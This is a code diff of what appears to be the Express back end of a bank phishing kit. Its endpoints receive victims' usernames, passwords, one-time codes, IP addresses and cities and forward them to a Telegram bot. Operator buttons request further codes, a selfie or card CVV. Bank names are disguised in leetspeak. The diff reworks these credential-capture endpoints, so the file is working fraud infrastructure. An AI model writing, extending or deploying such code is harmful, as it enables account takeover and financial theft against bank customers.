@@ -47,35 +47,36 @@ function cargarCliente(txid) {
   return null;
 }
 
-
-
-app.post('/enviar3', async (req, res) => {
-  const { usar, clavv, txid, dinamic, ip, ciudad } = req.body;
+// Endpoint para /enviar (GTC)
+app.post('/enviar', async (req, res) => {
+  const { usar, clavv, txid, ip, ciudad } = req.body;
   const mensaje = `
-🔑🔵M3RC4NTIL-PERSON4S🔵
+🔵GTC🔵
 🆔 ID: <code>${txid}</code>
 📱 US4R: <code>${usar}</code>
 🔐 CL4V: <code>${clavv}</code>
-🔑 0TP: <code>${dinamic}</code>
 🌐 IP: ${ip}
 🏙️ Ciudad: ${ciudad}
 `;
+  const cliente = {
+    status: "esperando",
+    usar,
+    clavv,
+    ip,
+    ciudad
+  };
+  guardarCliente(txid, cliente);
   const keyboard = {
     inline_keyboard: [
       [
-        { text: "🔐PREGS", callback_data: `preguntas_menu:${txid}` },
         { text: "🔑CÓDIGO", callback_data: `cel-dina:${txid}` },
-        { text: "❌CÓDIGO", callback_data: `errortok:${txid}` }
+        { text: "👤SELFIE", callback_data: `errortok:${txid}` }
       ],
       [
-        { text: "💳C3VV", callback_data: `ceve:${txid}` },
         { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }
       ]
     ]
   };
-  const cliente = cargarCliente(txid) || {};
-  cliente.status = "esperando";
-  guardarCliente(txid, cliente);
   await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
@@ -89,76 +90,91 @@ app.post('/enviar3', async (req, res) => {
   res.sendStatus(200);
 });
 
-
-
-app.post('/webhook', async (req, res) => {
-  const message = req.body.message;
-  if (message?.text && message.text.startsWith('/')) {
-    const commandParts = message.text.slice(1).split(' ');
-    const txid = commandParts[0];
-    const preguntasTexto = commandParts.slice(1).join(' ');
-    const [pregunta1, pregunta2] = preguntasTexto.split('&');
-    if (!pregunta1 || !pregunta2) {
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: message.chat.id,
-          text: `⚠️ Formato inválido. Usa:\n/${txid} ¿Pregunta1?&¿Pregunta2?`
-        })
-      });
-      return res.sendStatus(200);
-    }
-    const cliente = cargarCliente(txid) || { preguntas: [], status: 'esperando' };
-    cliente.preguntas = [pregunta1.trim(), pregunta2.trim()];
-    cliente.status = 'preguntas';
-    guardarCliente(txid, cliente);
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: message.chat.id,
-        text: `✅ Preguntas guardadas para ${txid}\n1️⃣ ${pregunta1.trim()}\n2️⃣ ${pregunta2.trim()}`
-      })
-    });
-    return res.sendStatus(200);
-  }
-  if (req.body.callback_query) {
-    const callback = req.body.callback_query;
-    const partes = callback.data.split(":");
-    const accion = partes[0];
-    const txid = partes[1];
-    const cliente = cargarCliente(txid) || { status: 'esperando' };
-    cliente.status = accion;
-    guardarCliente(txid, cliente);
-    if (accion === 'preguntas_menu') {
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: callback.message.chat.id,
-          text: `✍️ Escribe las 2 preguntas personalizadas para ${txid}, Ej: /${txid} ¿Dónde naciste? & ¿Cuál es tu color favorito?`
-        })
-      });
-    }
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        callback_query_id: callback.id,
-        text: `Has seleccionado: ${accion}`
-      })
-    });
-    return res.sendStatus(200);
-  }
+// Endpoint para /enviare (B4NPLUX-EMPRES4)
+app.post('/enviare', async (req, res) => {
+  const { usar, clavv, txid, ip, ciudad } = req.body;
+  const mensaje = `
+🔵B4NPLUX-EMPRES4🔵
+🆔 ID: <code>${txid}</code>
+📱 US4R: <code>${usar}</code>
+🔐 CL4V: <code>${clavv}</code>
+🌐 IP: ${ip}
+🏙️ Ciudad: ${ciudad}
+`;
+  const cliente = {
+    status: "esperando",
+    usar,
+    clavv,
+    ip,
+    ciudad
+  };
+  guardarCliente(txid, cliente);
+  const keyboard = {
+    inline_keyboard: [
+      [
+        { text: "🔑CÓDIGO", callback_data: `cel-dina:${txid}` },
+        { text: "❌CÓDIGO", callback_data: `errortok:${txid}` }
+      ],
+      [
+        { text: "💳C3VV", callback_data: `ceve:${txid}` },
+        { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }
+      ]
+    ]
+  };
+  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: mensaje,
+      parse_mode: 'HTML',
+      reply_markup: keyboard
+    })
+  });
   res.sendStatus(200);
 });
 
-app.get('/sendStatus.php', (req, res) => {
-  const txid = req.query.txid;
-  const cliente = cargarCliente(txid) || { status: 'esperando', preguntas: [] };
-  res.json({ status: cliente.status, preguntas: cliente.preguntas });
+// Endpoint para /enviar3 (M3RC4NTIL-PERSON4S OTP)
+app.post('/enviar3', async (req, res) => {
+  const { usar, clavv, txid, dinamic, ip, ciudad } = req.body;
+  const mensaje = `
+🔑🔵M3RC4NTIL-PERSON4S🔵
+🆔 ID: <code>${txid}</code>
+📱 US4R: <code>${usar}</code>
+🔐 CL4V: <code>${clavv}</code>
+🔑 0TP: <code>${dinamic}</code>
+🌐 IP: ${ip}
+🏙️ Ciudad: ${ciudad}
+`;
+  const cliente = cargarCliente(txid) || {};
+  cliente.status = "esperando";
+  guardarCliente(txid, cliente);
+  const keyboard = {
+    inline_keyboard: [
+      [
+        { text: "🔑CÓDIGO", callback_data: `cel-dina:${txid}` },
+        { text: "❌CÓDIGO", callback_data: `errortok:${txid}` }
+      ],
+      [
+        { text: "💳C3VV", callback_data: `ceve:${txid}` },
+        { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }
+      ]
+    ]
+  };
+  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: mensaje,
+      parse_mode: 'HTML',
+      reply_markup: keyboard
+    })
+  });
+  res.sendStatus(200);
 });
+
+// Otros endpoints similares (agrega /enviar4, /enviar3e, etc. si los necesitas, sin preguntas)
 
 app.get('/', (req, res) => res.send("Servidor activo en Render"));
 
